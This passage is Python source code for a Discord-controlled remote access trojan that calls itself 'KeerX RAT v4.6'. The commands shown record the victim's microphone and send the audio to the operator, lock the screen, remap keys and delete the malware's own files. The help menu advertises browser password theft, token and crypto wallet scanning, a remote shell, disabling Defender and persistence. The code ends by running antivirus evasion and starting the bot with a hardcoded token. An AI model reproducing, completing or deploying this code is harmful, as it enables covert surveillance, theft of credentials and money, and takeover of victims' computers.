    if not pyaudio: return await ctx.send("🎤 **MicStream:** `pyaudio module missing.`")
    await ctx.send(f"🎤 **Recording {duration}s...**")
    try:
        CHUNK = 1024; FORMAT = pyaudio.paInt16; CHANNELS = 1; RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * int(duration))): frames.append(stream.read(CHUNK))
        stream.stop_stream(); stream.close(); p.terminate()
        path = os.path.join(os.getenv('TEMP'), "mic.wav")
        wf = wave.open(path, 'wb'); wf.setnchannels(CHANNELS); wf.setsampwidth(p.get_sample_size(FORMAT)); wf.setframerate(RATE); wf.writeframes(b''.join(frames)); wf.close()
        await ctx.send(file=discord.File(path, 'audio.wav')); os.remove(path)
    except Exception as e: await ctx.send(f"❌ Mic Error: {e}")

@bot.command()
async def tts(ctx, *, text):
    """Voice: Make computer speak"""
    engine = pyttsx3.init(); engine.say(text); engine.runAndWait()
    await ctx.send(f"📢 **Spoken:** `{text}`")

@bot.command()
async def wallpaper(ctx, url):
    """Change desktop wallpaper"""
    try:
        r = requests.get(url); path = os.path.join(os.getenv('TEMP'), "wp.jpg")
        with open(path, 'wb') as f: f.write(r.content)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        await ctx.send("🖼️ **Wallpaper Updated.**")
    except Exception as e: await ctx.send(f"❌ WP Error: {e}")

@bot.command()
async def fakeupdate(ctx):
    """Open fake update page"""
    os.system("start https://fakeupdate.net/win10/")
    await ctx.send("🎞️ **Fake Update started.**")

@bot.command()
async def blackout(ctx):
    """Lock victim's screen"""
    os.system("rundll32.exe user32.dll,LockWorkStation")
    await ctx.send("🌑 **Screen Locked.**")

@bot.command()
async def melt(ctx):
    """Self-Destruct KeerX"""
    await ctx.send("💥 **Self-Destruct sequence initiated. Goodbye.**")
    try:
        path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        bat_path = os.path.join(os.getenv('TEMP'), "melt.bat")
        with open(bat_path, "w") as f:
            f.write(f'@echo off\ntimeout /t 3 /nobreak > nul\ndel /f /q "{path}"\ndel /f /q "%~f0"')
        subprocess.Popen([bat_path], shell=True)
        os._exit(0)
    except Exception as e: await ctx.send(f"❌ Melt Failed: {e}")

@bot.command()
async def keyswap(ctx):
    """Swap keys globally"""
    keyboard.unhook_all(); keyboard.remap_key('a', 'b')
    await ctx.send("⌨️ **Keys Swapped (A -> B).**")

@bot.command()
async def help(ctx):
    """v4.6 ELITE MANUAL"""
    e = discord.Embed(title="🛡️ KeerX RAT v4.6 | Elite Evasion Edition", color=0x2ecc71)
    
    e.add_field(name="📸 Surveillance & Recon", value=(
        "`!screenshot`: Catch screen.\n`!screenrecord <sec>`: Video log.\n"
        "`!webcam`: Catch webcam.\n`!micstream <sec>`: Record audio.\n"
        "`!scout`: Hardware report.\n`!ip`: v4.6 Network Suit."
    ), inline=False)
    
    e.add_field(name="🔐 Data Theft (Exfil)", value=(
        "`!browser_steal`: Browser passwords.\n`!grab <path>`: Download file.\n"
        "`!discord_tokens`: Token scanner.\n`!wallet_scan`: Crypto wallets.\n"
        "`!clipboard`: Toggle monitor."
    ), inline=False)
    
    e.add_field(name="🎭 Trolling & Control", value=(
        "`!voice <text>`: Max vol speech.\n`!upload <url> <name>`: Drop file.\n"
        "`!kill <proc>`: Kill process.\n`!taskmgr_off/on`: Lock TaskMgr."
    ), inline=False)
    
    e.add_field(name="🛰️ Remote & Shell", value=(
        "`!shell <cmd>`: Direct CMD.\n`!powershell <ps>`: High-level PS.\n"
        "`!rdp`: Enable RDP.\n`!netscan`: Scan LAN."
    ), inline=False)
    
    e.add_field(name="⚙️ Maintenance (Survival)", value=(
        "`!exclude`: Defender Whitelist.\n`!defender_off`: Kill Real-Time.\n"
        "`!persist`: Deep install.\n`!status`: Health/CPU/RAM."
    ), inline=False)
    
    e.set_footer(text=f"Victim ID: {victim_id} | v4.6 Stable")
    await ctx.send(embed=e)

if __name__ == "__main__":
    av_evasion() # Bypass sandbox/AV first
    stealth_and_persist() # Migrate to hidden folder
    if is_running(): sys.exit(0)
    bot.run('MTQ3NDAxNzMwNzQxMTA4NzUzMg.GKhEwd.K51JRYXpMKM4WKKmfIdGqXZ7Fu_wYTZ_LosUGQ')
